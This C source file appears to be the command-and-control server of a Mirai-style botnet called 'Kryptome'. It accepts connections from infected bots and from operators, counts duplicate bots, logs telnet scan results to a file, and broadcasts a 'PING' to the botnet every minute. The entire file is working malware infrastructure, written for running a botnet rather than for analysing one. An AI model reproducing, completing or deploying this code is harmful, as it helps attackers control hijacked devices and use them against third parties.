#include <stdio.h>																																																																																										//bWFkZSBieSB4eHg=
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#include "includes.h"
#include "user.h"
#include "bots.h"
#include "util.h"
#include "resolver.h"

struct args
{
	int sock;
	struct sockaddr_in cli_addr;
};

static volatile FILE * telFD;
static volatile FILE * fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int DupsFound = 0;
static volatile int scannerreport;

void add_operator()
{
	OperatorsConnected++;
}

void del_operator()
{
	OperatorsConnected--;
}

int get_operator()
{
	return OperatorsConnected;
}

void add_dup()
{
	DupsFound++;
}

int get_dup()
{
	return DupsFound;
}

void *BotListener(int port)
{
	int sockfd, newsockfd;
	int s = 1;
	socklen_t clilen;
	struct sockaddr_in serv_addr, cli_addr;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) perror("ERROR opening socket");
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &s, sizeof(s));
	bzero((char*) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(port);
	if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
	listen(sockfd, 5);
	clilen = sizeof(cli_addr);
	while (1)
	{
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
		if (newsockfd < 0) perror("ERROR on accept");
		struct telnetdata_t *admin = admin_retrieve_user_fd(newsockfd);
		admin->connected = 1;
		admin->authed = 0;
		admin->addr = cli_addr.sin_addr.s_addr;
		pthread_create(&(admin->main_thr), NULL, &BotWorker, (void*) newsockfd);
	}
}

int main(int argc, char *argv[], void *sock)
{
	system("mkdir logfiles");
	signal(SIGPIPE, SIG_IGN);
	int s, threads, port;
	struct epoll_event event;
	if (argc != 4)
	{
		fprintf(stderr, "Usage: %s[port][threads][cnc-port]\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	port = atoi(argv[3]);
	threads = atoi(argv[2]);
	if (threads > 850)
	{
		printf("Lower that mf threads lmao\n");
		return 0;
	}
	else if (threads < 850)
	{
		printf("good choice in threading\n");
	}
	
	admin_init_vectors();

	printf("\x1b[1;90m[\x1b[97mKryptome\x1b[1;90m] \x1b[97mscreened succesfully\n");
	telFD = fopen("logfiles/telnet.txt", "a+");
	listenFD = create_and_bind(argv[1]);
	if (listenFD == -1) abort();
	s = make_socket_non_blocking(listenFD);
	if (s == -1) abort();
	s = listen(listenFD, SOMAXCONN);
	if (s == -1)
	{
		perror("listen");
		abort();
	}

	epollFD = epoll_create1(0);
	if (epollFD == -1)
	{
		perror("epoll_create");
		abort();
	}

	event.data.fd = listenFD;
	event.events = EPOLLIN | EPOLLET;
	s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
	if (s == -1)
	{
		perror("epoll_ctl");
		abort();
	}

	struct bots_worker_args args;
	args.epollfd = epollFD;
	args.listenfd = listenFD;

	pthread_t thread[threads + 2];
	while (threads--)
	{
		pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void*)&args);
	}

	pthread_create(&thread[0], NULL, &BotListener, port);
	while (1)
	{
		broadcast("PING", -1);
		sleep(60);
	}

	close(listenFD);
	return EXIT_SUCCESS;	//bWFkZSBieSB4eHg=
}
